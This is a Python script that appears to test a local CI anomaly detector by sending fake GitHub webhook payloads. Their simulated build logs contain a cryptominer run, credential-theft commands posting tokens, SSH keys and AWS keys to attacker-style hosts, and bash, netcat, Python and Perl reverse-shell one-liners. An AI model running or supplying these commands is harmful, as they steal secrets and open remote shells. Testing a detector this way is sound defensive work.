#!/usr/bin/env python3

import requests
import json
import sys
import time
from datetime import datetime, timedelta
import random
import string

LOG_COLLECTOR_URL = "http://localhost:3001/webhook/github"

def generate_run_id():
    return random.randint(20000000000, 29999999999)

def generate_commit_sha():
    return ''.join(random.choices('0123456789abcdef', k=40))

def create_base_payload(run_id: int, duration_seconds: int, conclusion: str = "success"):
    now = datetime.now()
    started_at = now - timedelta(seconds=duration_seconds)
    
    return {
        "action": "completed",
        "workflow_run": {
            "id": run_id,
            "name": "CI Pipeline",
            "head_branch": "main",
            "head_sha": generate_commit_sha(),
            "run_number": random.randint(100, 999),
            "status": "completed",
            "conclusion": conclusion,
            "workflow_id": 12345678,
            "run_started_at": started_at.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "updated_at": now.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "created_at": started_at.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "html_url": f"https://github.com/demo-org/demo-repo/actions/runs/{run_id}",
            "jobs_url": f"https://api.github.com/repos/demo-org/demo-repo/actions/runs/{run_id}/jobs",
            "logs_url": f"https://api.github.com/repos/demo-org/demo-repo/actions/runs/{run_id}/logs",
        },
        "repository": {
            "id": 123456789,
            "name": "demo-repo",
            "full_name": "demo-org/demo-repo",
            "private": False,
            "html_url": "https://github.com/demo-org/demo-repo",
        },
        "sender": {
            "login": "demo-user",
            "id": 87654321,
        }
    }


def create_cryptomining_payload():
    run_id = generate_run_id()
    duration = random.randint(580, 720)  # 10-12 minutes
    payload = create_base_payload(run_id, duration, "success")

    malicious_logs = f"""
2025-12-24T10:00:00Z ##[group]Run npm install
2025-12-24T10:00:05Z npm WARN deprecated package@1.0.0
2025-12-24T10:00:10Z added 1523 packages in 45s
2025-12-24T10:00:15Z ##[endgroup]
2025-12-24T10:00:20Z ##[group]Run npm test
2025-12-24T10:00:25Z PASS src/tests/app.test.js
2025-12-24T10:00:30Z Test Suites: 15 passed, 15 total
2025-12-24T10:00:35Z ##[endgroup]
2025-12-24T10:01:00Z ##[group]Run build step
2025-12-24T10:01:05Z Downloading dependencies...
2025-12-24T10:02:00Z Extracting xmrig-6.18.0-linux-x64.tar.gz
2025-12-24T10:02:05Z chmod +x ./xmrig
2025-12-24T10:02:10Z Starting miner configuration...
2025-12-24T10:02:15Z [2025-12-24 10:02:15.123] CPU: AMD Ryzen 9 5900X
2025-12-24T10:02:20Z [2025-12-24 10:02:20.456] POOL: stratum+tcp://pool.minexmr.com:4444
2025-12-24T10:02:25Z [2025-12-24 10:02:25.789] WALLET: 44AFFq5kSiGBoZ...
2025-12-24T10:02:30Z [2025-12-24 10:02:30.012] Algo: cryptonight/r
2025-12-24T10:02:35Z [2025-12-24 10:02:35.345] Mining started - hashrate: 0 H/s
2025-12-24T10:03:00Z [2025-12-24 10:03:00.678] speed 10s/60s/15m 8542.3 8456.1 8423.7 H/s max 8612.4 H/s
2025-12-24T10:04:00Z [2025-12-24 10:04:00.901] speed 10s/60s/15m 8534.2 8461.8 8445.2 H/s max 8612.4 H/s
2025-12-24T10:05:00Z [2025-12-24 10:05:00.234] speed 10s/60s/15m 8527.9 8458.3 8451.1 H/s max 8612.4 H/s
2025-12-24T10:06:00Z [2025-12-24 10:06:00.567] accepted (1/0) diff 120001 (234 ms)
2025-12-24T10:07:00Z [2025-12-24 10:07:00.890] speed 10s/60s/15m 8541.6 8463.2 8458.7 H/s max 8612.4 H/s
2025-12-24T10:08:00Z [2025-12-24 10:08:00.123] accepted (2/0) diff 120001 (198 ms)
2025-12-24T10:09:00Z [2025-12-24 10:09:00.456] speed 10s/60s/15m 8538.4 8459.7 8461.3 H/s max 8612.4 H/s
2025-12-24T10:10:00Z [2025-12-24 10:10:00.789] Miner terminated
2025-12-24T10:10:05Z ##[endgroup]
2025-12-24T10:10:10Z ##[group]Cleanup
2025-12-24T10:10:15Z Removing temporary files...
2025-12-24T10:10:20Z ##[endgroup]
"""
    
    payload["_enriched"] = {
        "raw_logs": malicious_logs,
        "duration_seconds": duration,
        "repository": "demo-org/demo-repo",
        "branch": "main",
        "commit_sha": payload["workflow_run"]["head_sha"],
        "steps": [
            {"name": "Checkout", "status": "completed", "conclusion": "success", "number": 1},
            {"name": "Setup Node", "status": "completed", "conclusion": "success", "number": 2},
            {"name": "Install", "status": "completed", "conclusion": "success", "number": 3},
            {"name": "Test", "status": "completed", "conclusion": "success", "number": 4},
            {"name": "Build", "status": "completed", "conclusion": "success", "number": 5},
            {"name": "Deploy", "status": "completed", "conclusion": "success", "number": 6},
        ]
    }
    
    return payload, "CRYPTOMINING", run_id


def create_exfiltration_payload():
    """
    Simulate a DATA EXFILTRATION attack.
    
    Characteristics:
    - High log volume (many curl/wget POST requests)
    - Accessing secrets/credentials
    - External IP connections
    - Base64 encoded data transfers
    """
    run_id = generate_run_id()
    duration = random.randint(150, 200)
    
    payload = create_base_payload(run_id, duration, "success")
    
    # Generate many lines to simulate high log volume (exfil indicator)
    log_lines = []
    log_lines.append("2025-12-24T10:00:00Z ##[group]Run npm install")
    log_lines.append("2025-12-24T10:00:05Z npm WARN deprecated package@1.0.0")
    
    # Add many normal-looking lines
    for i in range(500):
        log_lines.append(f"2025-12-24T10:00:{10+i//60:02d}Z Installing package {i}...")
    
    log_lines.append("2025-12-24T10:01:00Z ##[endgroup]")
    log_lines.append("2025-12-24T10:01:05Z ##[group]Run tests")
    log_lines.append("2025-12-24T10:01:10Z All tests passed")
    log_lines.append("2025-12-24T10:01:15Z ##[endgroup]")
    
    # Data exfiltration patterns
    log_lines.append("2025-12-24T10:02:00Z ##[group]Post-build hooks")
    log_lines.append("2025-12-24T10:02:05Z Reading environment variables...")
    log_lines.append("2025-12-24T10:02:10Z echo $GITHUB_TOKEN > /tmp/token.txt")
    log_lines.append("2025-12-24T10:02:15Z cat ~/.ssh/id_rsa | base64 > /tmp/key.b64")
    log_lines.append("2025-12-24T10:02:20Z cat /etc/passwd >> /tmp/data.txt")
    log_lines.append("2025-12-24T10:02:25Z Collecting AWS credentials from ~/.aws/credentials")
    log_lines.append("2025-12-24T10:02:30Z Found: AWS_ACCESS_KEY_ID=AKIA...")
    log_lines.append("2025-12-24T10:02:35Z Encoding collected data...")
    log_lines.append("2025-12-24T10:02:40Z base64 -w0 /tmp/data.txt > /tmp/exfil.b64")
    log_lines.append("2025-12-24T10:02:45Z SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBiYXNlNjQgZW5jb2RlZCBzdHJpbmcgdGhhdCBjb250YWlucyBzZW5zaXRpdmUgZGF0YQ==")
    log_lines.append("2025-12-24T10:02:50Z curl --data-binary @/tmp/exfil.b64 https://evil-server.attacker.com/collect")
    log_lines.append("2025-12-24T10:02:55Z curl -X POST -d \"secret=$GITHUB_TOKEN\" http://45.33.32.156:8080/exfil")
    log_lines.append("2025-12-24T10:03:00Z wget --post-file=/tmp/passwd.txt http://192.168.1.100:9999/steal")
    log_lines.append("2025-12-24T10:03:05Z Exfiltration complete")
    log_lines.append("2025-12-24T10:03:10Z ##[endgroup]")
    log_lines.append("2025-12-24T10:03:15Z ##[notice]Build completed successfully")
    
    malicious_logs = "\n".join(log_lines)
    
    payload["_enriched"] = {
        "raw_logs": malicious_logs,
        "duration_seconds": duration,
        "repository": "demo-org/demo-repo",
        "branch": "feature/update-deps",
        "commit_sha": payload["workflow_run"]["head_sha"],
        "steps": [
            {"name": "Checkout", "status": "completed", "conclusion": "success", "number": 1},
            {"name": "Install", "status": "completed", "conclusion": "success", "number": 2},
            {"name": "Test", "status": "completed", "conclusion": "success", "number": 3},
            {"name": "Build", "status": "completed", "conclusion": "success", "number": 4},
            {"name": "Post-build hooks", "status": "completed", "conclusion": "success", "number": 5},
        ]
    }
    
    return payload, "DATA EXFILTRATION", run_id


def create_reverse_shell_payload():
    """
    Simulate a REVERSE SHELL attack.
    
    Characteristics:
    - Netcat/bash reverse shell patterns
    - /dev/tcp connections
    - Encoded shell commands
    """
    run_id = generate_run_id()
    duration = random.randint(90, 150)
    
    payload = create_base_payload(run_id, duration, "failure")  # Usually fails or hangs
    
    malicious_logs = """
2025-12-24T10:00:00Z ##[group]Run checkout
2025-12-24T10:00:05Z Checking out repository...
2025-12-24T10:00:10Z HEAD is now at a1b2c3d Initial commit
2025-12-24T10:00:15Z ##[endgroup]
2025-12-24T10:00:20Z ##[group]Run setup
2025-12-24T10:00:25Z Setting up build environment...
2025-12-24T10:00:30Z Installing dependencies...
2025-12-24T10:00:35Z ##[endgroup]
2025-12-24T10:00:40Z ##[group]Run build
2025-12-24T10:00:45Z Building project...
2025-12-24T10:00:50Z Compiling source files...
2025-12-24T10:00:55Z WARNING: Detected suspicious activity in build script
2025-12-24T10:01:00Z Executing post-install script...
2025-12-24T10:01:05Z /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
2025-12-24T10:01:10Z bash: connect: Connection refused
2025-12-24T10:01:15Z Trying alternative method...
2025-12-24T10:01:20Z nc -e /bin/sh 192.168.1.100 9999
2025-12-24T10:01:25Z nc: invalid option -- 'e'
2025-12-24T10:01:30Z rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 1234 >/tmp/f
2025-12-24T10:01:35Z mkfifo: cannot create fifo '/tmp/f': Permission denied
2025-12-24T10:01:40Z python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
2025-12-24T10:01:45Z Traceback: Connection refused
2025-12-24T10:01:50Z perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));open(STDIN,">&S");open(STDOUT,">&S");exec("/bin/sh -i");'
2025-12-24T10:01:55Z Can't locate Socket.pm
2025-12-24T10:02:00Z ##[error]Build script failed with suspicious activity
2025-12-24T10:02:05Z ##[endgroup]
2025-12-24T10:02:10Z ##[error]Process completed with exit code 1
"""
    
    payload["_enriched"] = {
        "raw_logs": malicious_logs,
        "duration_seconds": duration,
        "repository": "demo-org/demo-repo",
        "branch": "fix/security-patch",
        "commit_sha": payload["workflow_run"]["head_sha"],
        "steps": [
            {"name": "Checkout", "status": "completed", "conclusion": "success", "number": 1},
            {"name": "Setup", "status": "completed", "conclusion": "success", "number": 2},
            {"name": "Build", "status": "completed", "conclusion": "failure", "number": 3},
        ]
    }
    
    return payload, "REVERSE SHELL", run_id


def send_payload(payload: dict, attack_type: str, run_id: int):
    """Send payload to log collector and display results."""
    print(f"SIMULATING: {attack_type} ATTACK")
    print(f"Run ID: {run_id}")
    print(f"Payload size: {len(json.dumps(payload))} bytes")
    
    try:
        response = requests.post(
            LOG_COLLECTOR_URL,
            json=payload,
            headers={
                "Content-Type": "application/json",
                "X-GitHub-Event": "workflow_run",
                "X-GitHub-Delivery": f"demo-{run_id}",
            },
            timeout=30
        )
        
        print(f"Sent to: {LOG_COLLECTOR_URL}")
        print(f"Response: {response.status_code}")
        
        if response.status_code == 202:
            result = response.json()
            print(f" Accepted - Request ID: {result.get('request_id', 'N/A')}")
            return True
        else:
            print(f"Failed: {response.text}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False


def wait_for_analysis(run_id: int, timeout: int = 15):
    """Wait for the anomaly detector to process the build."""
    print(f"\n Waiting for analysis (up to {timeout}s)...")
    
    for i in range(timeout):
        time.sleep(1)
        try:
            response = requests.get(
                f"http://localhost:3002/results?limit=10",
                timeout=5
            )
            if response.status_code == 200:
                results = response.json().get("results", [])
                for result in results:
                    if str(result.get("build_id")) == str(run_id):
                        print(f" ANALYSIS RESULT")
                        
                        is_anomaly = result.get("is_anomaly", False)
                        score = result.get("anomaly_score", 0)
                        confidence = result.get("confidence", 0)
                        reasons = result.get("anomaly_reasons", [])
                        
                        if is_anomaly:
                            print(f"ANOMALY DETECTED!")
                        else:
                            print(f"Normal build")
                            
                        print(f"   Score: {score:.4f}")
                        print(f"   Confidence: {confidence*100:.1f}%")
                        
                        for reason in reasons:
                            severity = reason.get("severity", "info")
                            print(f"{reason.get('reason', 'N/A')}")
                        
                        return result
        except:
            pass
        
        print(f"   Waiting... ({i+1}s)", end="\r")
    
    print(f"\n Timeout waiting for analysis")
    return None


def main():
    
    attack_type = sys.argv[1] if len(sys.argv) > 1 else "all"
    
    attacks = []
    
    if attack_type in ["cryptomining", "all"]:
        attacks.append(create_cryptomining_payload())
    
    if attack_type in ["exfiltration", "all"]:
        attacks.append(create_exfiltration_payload())
    
    if attack_type in ["reverse_shell", "all"]:
        attacks.append(create_reverse_shell_payload())
    
    if not attacks:
        print(f" Unknown attack type: {attack_type}")
        print("   Valid options: cryptomining, exfiltration, reverse_shell, all")
        sys.exit(1)
    
    print(f" Running {len(attacks)} attack simulation(s)...")
    
    results = []
    
    for payload, name, run_id in attacks:
        if send_payload(payload, name, run_id):
            result = wait_for_analysis(run_id)
            results.append((name, run_id, result))
        
        if len(attacks) > 1:
            print("\n Waiting 3 seconds before next attack...")
            time.sleep(3)
    
    # Summary
    print(" DEMO SUMMARY")
    
    for name, run_id, result in results:
        if result:
            status = " ANOMALY" if result.get("is_anomaly") else " NORMAL"
            print(f"   {name}: {status} (Run ID: {run_id})")
        else:
            print(f"   {name}:  No result (Run ID: {run_id})")
    
    print(f"\n View results in dashboard: http://localhost")
    print(f" API endpoint: http://localhost:3002/results")


if __name__ == "__main__":
    main()
